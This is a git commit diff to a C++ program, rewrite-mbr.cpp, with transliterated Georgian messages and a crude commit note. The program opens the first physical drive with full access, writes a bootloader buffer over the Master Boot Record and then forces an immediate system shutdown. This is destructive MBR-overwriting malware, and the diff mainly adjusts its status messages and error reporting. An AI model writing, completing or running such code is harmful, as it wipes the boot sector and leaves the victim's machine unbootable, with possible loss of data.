6dc316740e745a334e5a776b7e9da69d0461b185
xd3d9 <idkidkidkidkzero@mail.ru>
2024-12-23 05:35:06 +0400

    debugging, debili vikavi mara mere gavanlize rashic iko sakme

--- rewrite-mbr.cpp
+++ rewrite-mbr.cpp
@@ -7,20 +7,24 @@ int main()
 {
     HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     if (drive == INVALID_HANDLE_VALUE) {
-        printf("Ver Gavxsenit Draivi\n");
+        printf("Ver Gavkhsenit Draivi\n");
         return EXIT_FAILURE;
     }
 
+
+
     DWORD bytes_written;
     if (!WriteFile(drive, bootloader, bootloader_len, &bytes_written, NULL)) { // Dasafixia
-        printf("Ver Gadavaweret MBRs\n");
+        printf("Ver Gadavatseret MBRs\n");
     }
     else {
-        printf("Warmatebit Gadaewera %d Baiti MBRs\n", bytes_written);
+        printf("Tsarmatebit Gadaetsera %d Baiti MBRs\n", bytes_written);
     }
+    printf("Shevetsadet Chagvetsera %u Biti, Magram Mxolod %lu Bitis Chatsera Movakherkhet.\n", bootloader_len, bytes_written);
 
     CloseHandle(drive);
-
+    DWORD error_code = GetLastError();
+    printf("Erorma Amogvigdo: %lu\n", error_code);
     Sleep(1000);
     system("C:\\Windows\\System32\\shutdown /s /t 0");
     return EXIT_SUCCESS;
